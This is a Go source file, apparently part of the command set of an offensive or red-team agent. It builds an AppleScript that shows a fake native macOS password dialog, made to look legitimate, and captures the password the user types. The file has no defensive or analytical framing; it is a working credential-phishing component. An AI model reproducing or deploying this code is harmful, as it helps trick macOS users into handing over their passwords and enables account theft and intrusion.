package commands

import (
	"fmt"
	"strings"
)

// buildCredPromptScript creates an AppleScript that displays a native password dialog.
// The dialog uses the system icon and looks like a legitimate macOS prompt.
func buildCredPromptScript(title, message, icon string) string {
	// Escape special characters for AppleScript string literals
	title = escapeAppleScript(title)
	message = escapeAppleScript(message)
	icon = escapeAppleScript(icon)

	return fmt.Sprintf(
		`display dialog "%s" with title "%s" default answer "" with hidden answer with icon %s buttons {"Cancel", "OK"} default button "OK"
set theResult to text returned of result
return theResult`, message, title, icon)
}

// escapeAppleScript escapes characters that are special in AppleScript string literals.
func escapeAppleScript(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `"`, `\"`)
	return s
}
